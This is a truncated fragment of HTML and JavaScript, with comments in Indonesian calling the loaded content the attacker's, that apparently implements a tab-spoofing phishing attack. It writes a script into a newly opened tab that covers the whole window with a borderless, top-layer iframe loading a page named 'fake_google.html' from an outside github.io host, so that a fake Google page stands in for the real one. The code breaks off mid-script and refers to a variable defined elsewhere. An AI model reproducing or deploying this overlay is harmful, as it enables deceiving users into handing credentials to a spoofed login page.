<body>

<script>

  if (!tab) { alert("Blocked!"); return; }

  // Step 2 - Di tab baru, inject iframe
  // yang load konten dari attacker

    try {
      tab.document.write(`
        <script>
          const iframe = document.createElement('iframe');
          iframe.style.cssText = 'position:fixed;inset:0;width:100%;height:100%;border:none;z-index:9999;';
          iframe.src = 'https://raihanyasa2.github.io/spoof/fake_google.html';
          document.body.appendChild(iframe);
